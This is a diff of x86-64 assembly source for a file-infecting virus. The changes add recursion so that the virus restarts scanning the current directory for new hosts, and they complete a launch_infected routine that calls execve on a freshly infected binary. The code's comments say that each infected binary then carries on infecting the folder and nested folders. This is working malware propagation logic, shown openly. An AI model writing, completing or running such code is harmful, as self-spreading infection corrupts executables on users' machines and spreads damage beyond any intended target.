@@ -521,6 +521,7 @@ list_files:
 	dir_read_exit:
 	add rsp, 4
 	add rsp,1024
+
 retn
 
 ;void handle_dir(char *fname)
@@ -607,12 +608,25 @@ rec_infect_dir:
 	dir_read_exit:
 	add rsp, 4
 	add rsp,1024
+		
+	push 0x0000002e; our target directory here "."
+	call list_files; RECURSIVNESS HERE, if we couldn't find a new host for the virus... Restart the process starting at current directory
+	add rsp, 8
 retn
 
 ;void launch_infected(char *fname)
-;basically execve(fname, {fname, NULL}, NULL);
+;basically execve(fname, {fname, NULL}, {NULL});
 launch_infected:
+	sub rsp, 16; {fname, NULL}
 
+	mov QWORD[rsp], rdi
+	mov QWORD[rsp + 8], 0
+	lea rsi, [rsp]
+	lea rdx, [rsp + 8]
+	mov rax, 59
+	syscall;execve(fname, {fname, NULL}, {NULL});
+	add rsp, 16
+	jmp exit_prog; new infected binary will carry on infecting the rest of the folder and nested folders
 retn
 
 ;infect ONE file
